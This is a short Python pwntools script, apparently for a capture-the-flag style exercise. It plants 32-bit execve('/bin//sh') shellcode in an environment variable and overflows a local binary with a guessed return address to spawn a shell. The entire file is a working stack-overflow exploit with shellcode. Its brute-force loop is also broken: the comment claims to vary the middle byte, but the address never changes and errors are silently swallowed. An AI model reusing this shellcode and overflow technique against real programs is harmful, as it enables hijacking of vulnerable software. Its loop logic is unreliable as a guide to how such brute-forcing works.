from pwn import *
import os

# Set up shellcode environment
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
env_payload = shellcode

env = os.environ.copy()
env['SHELLCODE'] = env_payload.decode('latin-1')

# Brute force the middle byte
while True:
    addr = 0xffaae2e5
    
    print(f"[*] Trying: {hex(addr)}")
    
    test_payload = b"A" * 0x10 + p32(addr)
    
    try:
        p = process(['./a.out', test_payload], env=env, timeout=1)
        p.sendline(b'echo success')
        
        response = p.recv(timeout=1)
        if b'success' in response:
            print(f"[+] GOT SHELL at {hex(addr)}!")
            p.interactive()
            break
            
        p.close()
    except:
        pass

print("Done!")
